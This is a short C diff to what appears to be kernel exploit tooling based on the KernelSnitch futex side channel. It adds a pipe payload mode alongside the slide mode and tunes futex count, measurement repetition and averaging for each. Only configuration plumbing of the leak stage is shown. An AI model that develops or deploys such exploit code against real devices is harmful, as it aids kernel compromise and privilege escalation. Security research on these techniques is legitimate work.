@@ -67,7 +67,7 @@ static void configure_kernelsnitch_profile(
    * consumer.  Explicit variables make hardware A/B testing possible without
    * producing a new payload for every sample count.
    */
-  if (rmg_fast_profile_enabled()) {
+  if (payload_mode == PAGE_PAYLOAD_SLIDE && rmg_fast_profile_enabled()) {
     appended_futexes = SLIDE_KSNITCH_APPENDED_FUTEXES;
     if (repeat_measurement > 32) {
       repeat_measurement = 32;
@@ -75,6 +75,15 @@ static void configure_kernelsnitch_profile(
     if (average > 4) {
       average = 4;
     }
+  }
+#endif
+
+#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
+    defined(PIPE_KSNITCH_APPENDED_FUTEXES)
+  if (payload_mode == PAGE_PAYLOAD_PIPE) {
+    appended_futexes = PIPE_KSNITCH_APPENDED_FUTEXES;
+    repeat_measurement = PIPE_KSNITCH_REPEAT_MEASUREMENT;
+    average = PIPE_KSNITCH_AVERAGE;
   }
 #endif
 
@@ -442,10 +451,13 @@ static void put_slide_bank_entry(unsigned char *p, uintptr_t payload_base,
 void setup_kernelsnitch(void) {
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+#ifndef PIPE_KSNITCH_PAYLOAD_MODE
+#define PIPE_KSNITCH_PAYLOAD_MODE PAGE_PAYLOAD_SLIDE
+#endif
   ks = kernelsnitch_setup(
       MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS,
       KERNELSNITCH_VERBOSE, KERNELSNITCH_MTE_ENABLED);
-  configure_kernelsnitch_profile(ks, PAGE_PAYLOAD_SLIDE);
+  configure_kernelsnitch_profile(ks, PIPE_KSNITCH_PAYLOAD_MODE);
 #else
   ks = kernelsnitch_setup(
       MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
